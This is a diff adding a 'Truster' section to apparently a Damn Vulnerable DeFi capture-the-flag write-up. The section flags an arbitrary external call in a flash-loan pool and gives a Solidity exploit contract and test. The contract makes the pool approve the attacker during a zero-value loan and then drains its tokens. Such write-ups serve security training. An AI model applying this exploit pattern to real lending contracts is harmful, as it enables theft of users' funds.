@@ -68,3 +68,23 @@ Test file:
         forwarder.execute(request,signature);
     }
 ```
+## 3.Truster
+In ```TrusterLenderPll.sol``` line-28:
+```
+// @audit-issue This is an open external low-level call,very dangerous
+```
+Test file:
+```
+contract TrusterExploiter{
+    constructor(TrusterLenderPool _pool,DamnValuableToken _token,address _recovery){
+        bytes memory data=abi.encodeWithSignature("approve(address,uint256)",address(this),_token.balanceOf(address(_pool)));
+        _pool.flashLoan(0,address(this),address(_token),data);
+        _token.transferFrom(address(_pool),_recovery,_token.balanceOf(address(_pool)));
+    }
+}
+
+ function test_truster() public checkSolvedByPlayer {
+        new TrusterExploiter(pool,token,recovery);
+    }
+
+```
